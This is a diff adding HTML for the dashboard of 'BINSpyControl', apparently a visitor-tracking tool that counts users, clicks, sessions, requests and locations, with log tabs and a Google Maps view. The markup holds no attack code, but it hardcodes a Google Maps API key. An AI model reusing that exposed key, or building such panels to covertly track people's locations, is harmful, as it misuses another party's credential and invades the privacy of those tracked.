+        </span>
+        <div class="BINSpyControl-Preview--dataHosts---host----line"></div>
+        <span class="BINSpyControl-Preview--dataHosts---host----text">date: <span class="BINSpyControl-Preview--dataHosts---host----subText">2026-02-15 - 16:28:56</span>
+      </span>
+    </div>
+  </div>
+</div>
+</div>
+<div class="BINSpyControl-Preview--dataShow">
+<ul>
+</ul>
+</div>
+<div class="BINSpyControl-Preview--dataShow">
+<ul>
+</ul>
+</div>
+</div>
+</div> <!-- end(box) -->
+</div> <!-- end/modal -->
+<!-- end details -->
+<div class="BINSpyControl-Wrapper--Stats">
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">Online</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="onlineUsers">0</span>
+</div>
+<div class="BINSpyControl-Wrapper--Stats---lineSeparation"></div>
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">Users</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="usersTotal">0</span>
+</div>
+
+<div class="BINSpyControl-Wrapper--Stats---lineSeparation"></div>
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">clicks</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="clicksTotal">0</span>
+</div>
+<div class="BINSpyControl-Wrapper--Stats---lineSeparation"></div>
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">sessions</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="sessionsTotal">0</span>
+</div>
+<div class="BINSpyControl-Wrapper--Stats---lineSeparation"></div>
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">requests</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="requestsTotal">0</span>
+</div>
+<div class="BINSpyControl-Wrapper--Stats---lineSeparation"></div>
+<div class="BINSpyControl-Wrapper--Stats---Item">
+<h2 class="BINSpyControl-Wrapper--Stats---Item----text">Locations</h2>
+<span class="BINSpyControl-Wrapper--Stats---Item----number" id="locationsTotal">0</span>
+</div>
+</div>
+<!-- list requests & history -->
+<div class="BINSpyControl-History">
+<div class="BINSpyControl-History--Tabs">
+<button data-action="logs" class="BINSpyControl-History--Tabs---button is-active"><span class="BINSpyControl-History--Tabs---button----iconLogs"></span>Logs users</button>
+<button data-action="requests" class="BINSpyControl-History--Tabs---button"><span class="BINSpyControl-History--Tabs---button----iconRequests"></span>Request History</button>
+<button data-action="socialimpact" class="BINSpyControl-History--Tabs---button"><span class="BINSpyControl-History--Tabs---button----iconSocialImpact"></span>Social impact</button>
+</div>
+<div class="BINSpyControl-History--line"></div>
+<div id="listLogs" class="BINSpyControl-History--Logs" data-action="logs">
+</div>
+<!-- </.Logs -->
+<!-- requests -->
+<div id="listRequests" class="BINSpyControl-History--Logs" data-action="requests">
+
+</div>
+<!-- end(requests)-->
+<!-- socialimpact -->
+<div class="BINSpyControl-History--Logs" id="cntBINSpyContro_SocialImpact" data-action="socialimpact" style="overflow-x: hidden;">
+</div>
+<!-- end(socialimpact)-->
+<div class="BINSpyControl-Copyright">
+Powered by <a class="BINSpyControl-Copyright--link" href="https://x.com/ALIF101XL" title="Author">ALIF101XL</a>
+</div>
+</div><!-- </.Re -->
+<!-- fin list -->
+</div>
+</div>
+<!-- log -->
+<script src="../static/js/libs.min.js"></script>
+<script src="../static/js/base.js"></script>
+<script async defer
+src="https://maps.googleapis.com/maps/api/js?key=AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM&callback=initMap">
+</script>
+<script type="text/javascript">
+var copyUrl = function(id) {
+  var $temp = $("<input>");
+  $("body").append($temp);
+  $temp.val($(id).text()).select();
+  document.execCommand("copy");
+  $temp.remove();
+}
+window.gMapsApiKey="AIzaSyBUPHAjZl3n8Eza66ka6B78iVyPteC5MgM";
+</script>
+</body>
+</html>
